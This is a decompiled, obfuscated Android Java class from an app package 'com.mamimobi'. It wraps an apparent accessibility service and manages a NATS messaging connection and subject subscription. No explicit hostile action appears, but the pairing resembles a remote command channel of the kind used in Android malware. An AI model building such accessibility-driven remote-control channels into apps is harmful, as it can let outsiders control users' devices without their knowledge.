package defpackage;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkRequest;
import android.os.Handler;
import android.os.HandlerThread;
import com.mamimobi.AccessService;
import io.nats.client.Connection;
import io.nats.client.Dispatcher;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public final class jg0 {
    public final Context a;
    public final ExecutorService b;
    public final Handler c;
    public Connection d;
    public Dispatcher e;
    public volatile String h;
    public final AtomicBoolean f = new AtomicBoolean(false);
    public final AtomicBoolean g = new AtomicBoolean(false);
    public int i = 0;
    public final Object j = new Object();
    public final Object k = new Object();

    public jg0(AccessService accessService) {
        Context applicationContext = accessService.getApplicationContext();
        this.a = applicationContext;
        this.b = Executors.newSingleThreadExecutor();
        HandlerThread handlerThread = new HandlerThread("NatsHelperThread");
        handlerThread.start();
        this.c = new Handler(handlerThread.getLooper());
        ConnectivityManager connectivityManager = (ConnectivityManager) applicationContext.getSystemService("connectivity");
        if (connectivityManager != null) {
            connectivityManager.registerNetworkCallback(new NetworkRequest.Builder().addCapability(12).build(), new hg0(this));
        }
    }

    public final void a(String str) {
        this.h = str;
        if (o80.K(this.a)) {
            this.b.execute(new fg0(this, str, 0));
        }
    }

    public final void b(String str, String str2) {
        if (str == null || str.isEmpty()) {
            return;
        }
        this.b.execute(new j(this, str2, str, 3));
    }

    public final void c(String str) {
        Connection connection;
        if (str == null || str.isEmpty()) {
            return;
        }
        synchronized (this.k) {
            if (this.g.get() || (connection = this.d) == null) {
                return;
            }
            try {
                Dispatcher dispatcherCreateDispatcher = connection.createDispatcher(new gg0(0, this));
                this.e = dispatcherCreateDispatcher;
                dispatcherCreateDispatcher.subscribe(str);
                this.g.set(true);
            } catch (Exception e) {
                this.g.set(false);
                e.getMessage();
            }
        }
    }
}
